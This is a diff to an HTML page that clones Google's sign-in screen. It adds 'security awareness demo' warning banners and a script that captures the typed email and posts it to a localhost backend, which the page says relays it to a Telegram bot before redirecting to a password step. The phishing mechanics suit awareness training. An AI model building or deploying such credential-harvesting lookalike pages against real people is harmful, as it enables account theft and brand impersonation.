@@ -9,8 +9,34 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        .demo-banner {
+            background-color: #b3261e;
+            color: #ffffff;
+            text-align: center;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            padding: 14px 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(179, 38, 30, 0.3);
+        }
+        .demo-note {
+            font-size: 13px;
+            line-height: 1.6;
+            background-color: #fef7e0;
+            border: 1px solid #f9ab00;
+            border-radius: 8px;
+            padding: 12px 14px;
+            color: #3c4043;
+            margin-top: 16px;
+        }
+    </style>
 </head>
 <body>
+
+<div class="demo-banner">⚠️ SECURITY AWARENESS DEMO — THIS IS NOT GOOGLE ⚠️</div>
 
 <div class="main-container">
     <div class="signin-card">
@@ -20,6 +46,7 @@
             <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785658865/google_PNG19644_qmrkpz.png" alt=" Logo"  class="google-logo">
             <h1>Sign in</h1>
             <p>Use your Google Account</p>
+            <p class="demo-note"><strong>Fake page.</strong> This is a security awareness training simulation. The email you type will be sent to a Telegram bot for demonstration — never use real credentials.</p>
         </div>
 
         <!-- Right Section -->
@@ -43,6 +70,35 @@
 
     </div>
 </div>
+<script>
+    // SECURITY AWARENESS DEMO — NOT GOOGLE
+    document.querySelector('.next-button').addEventListener('click', async function () {
+        const email = document.getElementById('email').value.trim();
+        if (!email) {
+            alert('Please enter an email (use a fake one).');
+            return;
+        }
 
+        sessionStorage.setItem('demo_email', email);
+
+        // Send the email entry step to the Telegram demo bot.
+        const nextButton = this;
+        nextButton.disabled = true;
+        nextButton.textContent = 'Sending...';
+
+        try {
+            await fetch('http://localhost:8000/api/demo-submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: email, password: 'Email entry step' })
+            });
+        } catch (err) {
+            // Backend unreachable — proceed anyway so the demo flow continues.
+            console.warn('Demo backend unreachable:', err);
+        }
+
+        window.location.href = 'password.html';
+    });
+</script>
 </body>
 </html>
